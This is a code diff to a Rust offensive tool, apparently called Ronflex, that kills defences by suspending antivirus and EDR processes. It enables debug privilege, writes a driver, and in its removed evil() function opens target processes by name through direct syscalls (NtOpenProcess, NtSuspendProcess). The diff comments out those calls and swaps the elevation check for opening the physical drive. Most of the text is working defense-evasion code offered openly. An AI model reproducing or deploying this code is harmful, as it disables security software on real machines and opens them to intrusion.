@@ -35,6 +35,7 @@ use winapi::um::winnt::TOKEN_PRIVILEGES;
 use winapi::um::winnt::TOKEN_QUERY;
 use winreg::enums::*;
 use winreg::RegKey;
+use std::fs::File;
 
 const SE_DEBUG_NAME: [u16; 17] = [
     83u16, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0,
@@ -80,24 +81,6 @@ pub fn create_unicode_string(s: &[u16]) -> UNICODE_STRING {
     }
 }
 
-pub fn is_elevated() -> bool {
-    // source: https://github.com/rayiik/mimiRust/blob/main/src/utilities/mod.rs
-    let mut htoken: HANDLE = null_mut();
-    let mut token_elevate: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
-    let mut size: u32 = 0u32;
-    unsafe {
-        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut htoken);
-        GetTokenInformation(
-            htoken,
-            TokenElevation,
-            &mut token_elevate as *const _ as *mut _,
-            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
-            &mut size,
-        );
-        return token_elevate.TokenIsElevated == 1;
-    }
-}
-
 fn enable_privilege() -> bool {
     // source: https://github.com/rayiik/mimiRust/blob/main/src/utilities/mod.rs
     unsafe {
@@ -124,7 +107,10 @@ fn enable_privilege() -> bool {
                 return false;
             }
             _ => {
-                let message = format!("[+] Successfully used LookupPrivilegeValueW");
+                let message = format!(
+                    "[+] Successfully used LookupPrivilegeValueW with value {}",
+                    ntstatus
+                );
                 println!("{}", message);
             }
         }
@@ -268,69 +254,13 @@ fn write_driver() -> Result<PathBuf, Box<dyn std::error::Error>> {
     Ok(path)
 }
 
-fn evil(target: &str) {
-    let system = sysinfo::System::new_all();
+pub fn is_elevated() -> bool {
+    // thanks to https://github.com/redcode-labs/Coldfire/blob/109a68f93162711068a110d8b29cca19061776d0/os_windows.go
 
-    for p in system.processes_by_exact_name(target) {
-        println!("Targeting process: {} with PID: {}", p.name(), p.pid());
-        let pid: u32 = p.pid().as_u32();
-
-        let cid: CLIENT_ID = CLIENT_ID {
-            UniqueProcess: pid as _,
-            UniqueThread: 0 as _,
-        };
-
-        let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
-            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
-            RootDirectory: NULL,
-            ObjectName: NULL as _,
-            Attributes: 0,
-            SecurityDescriptor: NULL,
-            SecurityQualityOfService: NULL,
-        };
-
-        let mut handle: HANDLE = NULL;
-        let mut ntstatus: NTSTATUS;
-
-        unsafe {
-            ntstatus = syscall!(
-                "NtOpenProcess",
-                &mut handle,
-                PROCESS_SUSPEND_RESUME,
-                &oa,
-                &cid
-            );
-
-            match ntstatus {
-                0 => {}
-                _ => {
-                    let message = format!(
-                        "[-] Error accessing process: {} with PID: {}. NTSTATUS: {}. Skipping..",
-                        p.name(),
-                        p.pid(),
-                        ntstatus
-                    )
-                    .red();
-                    println!("{}", message);
-                    continue;
-                }
-            };
-
-            ntstatus = syscall!("NtSuspendProcess", handle);
-
-            match ntstatus {
-                0 => {
-                    let message = format!("[+] Ronflex worked! Have a good night {}", &pid).green();
-                    println!("{}", message);
-                }
-                _ => {
-                    let message = format!("[-] Ronflex failed.. NTSTATUS: {}", ntstatus).red();
-                    println!("{}", message);
-                }
-            }
-
-            let _ = syscall!("NtClose", handle);
-        }
+    let file = File::open("\\\\.\\PHYSICALDRIVE0");
+    match file {
+        Ok(_) => return true,
+        Err(_) => return false
     }
 }
 
@@ -405,11 +335,11 @@ fn main() {
             &args[1]
         );
         let target = &args[1];
-        evil(target);
+        //evil(target);
     } else {
         println!("[+] Starting. Attempting to clean your system from nasty AV/EDR solutions..");
         for target in product_list {
-            evil(target);
+            //evil(target);
         }
     }
 }
